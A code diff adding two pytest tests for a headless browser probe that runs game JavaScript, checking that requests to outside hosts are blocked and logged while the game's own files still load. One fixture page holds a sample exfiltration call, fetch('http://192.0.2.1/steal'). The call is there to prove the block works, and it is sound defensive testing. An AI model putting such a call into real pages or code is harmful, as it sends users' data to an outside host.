@@ -161,3 +161,35 @@ def test_headless_probe_hears_boot_errors(tmp_path, body, expect):
     assert len(errors) == expect
     if expect:
         assert "undefinedFunction" in errors[0]["message"]
+
+
+def test_probe_blocks_external_egress_and_logs_it(tmp_path, caplog, monkeypatch):
+    """The probe runs the game's own JS on the control-plane box — a request to anything but the
+    game's ephemeral server must die inside the browser."""
+    import logging
+    pytest.importorskip("playwright.sync_api")
+    monkeypatch.setattr(error_gate, "PROBE_SECONDS", 0.4)
+    gdir = _game(tmp_path, "<html><body><script>\n"
+                           "fetch('http://192.0.2.1/steal').catch(() => {});\n"
+                           "</script></body></html>")
+    with caplog.at_level(logging.WARNING):
+        errors = error_gate.probe(gdir)
+    assert errors == []
+    assert any("blocked" in r.getMessage() and "192.0.2.1" in r.getMessage()
+               for r in caplog.records)
+
+
+def test_probe_still_serves_the_games_own_files(tmp_path, caplog, monkeypatch):
+    import logging
+    pytest.importorskip("playwright.sync_api")
+    monkeypatch.setattr(error_gate, "PROBE_SECONDS", 0.4)
+    gdir = _game(tmp_path, "<html><body><script>\n"
+                           "fetch('data.json').then(r => {\n"
+                           "  if (!r.ok) throw new Error('local fetch failed');\n"
+                           "});\n"
+                           "</script></body></html>")
+    (gdir / "data.json").write_text("{}")
+    with caplog.at_level(logging.WARNING):
+        errors = error_gate.probe(gdir)
+    assert errors == []
+    assert not any("blocked" in r.getMessage() for r in caplog.records)
